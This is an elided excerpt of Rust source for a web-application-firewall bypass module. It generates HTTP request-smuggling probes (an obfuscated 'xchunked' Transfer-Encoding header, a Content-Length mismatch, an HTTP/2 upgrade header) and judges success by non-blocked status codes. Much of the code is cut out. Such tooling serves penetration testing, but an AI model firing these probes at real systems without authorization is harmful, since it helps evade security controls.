...
impl SmugglingBypass {
    ...
    pub async fn run(&self, client: &Client, url: &str, detection: &WafDetectionResult) -> Result<Vec<BypassResult>> {
    ...
    fn generate_smuggling_requests(&self, url: &str) -> Vec<SmugglingRequest> {
        ...
        requests.push(SmugglingRequest {
            ...
            path: path.to_string(),
            headers: vec![
                ("Transfer-Encoding".to_string(), "xchunked".to_string()),
            ],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
    ...
    fn generate_advanced_smuggling(&self, path: &str) -> Vec<SmugglingRequest> {
        ...
        requests.push(SmugglingRequest {
            ...
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), "88".to_string()),
            ],
        ...
        requests.push(SmugglingRequest {
            ...
            path: path.to_string(),
            headers: vec![
                ("Connection".to_string(), "Upgrade, HTTP2-Settings".to_string()),
    ...
    async fn test_smuggling(&self, client: &Client, url: &str, req: &SmugglingRequest, detection: &WafDetectionResult) -> Result<BypassResult> {
    ...
    fn is_bypass_successful(&self, status: u16, _detection: &WafDetectionResult) -> bool {
        ...
        !blocked_codes.contains(&status) && status < 500
    }
}
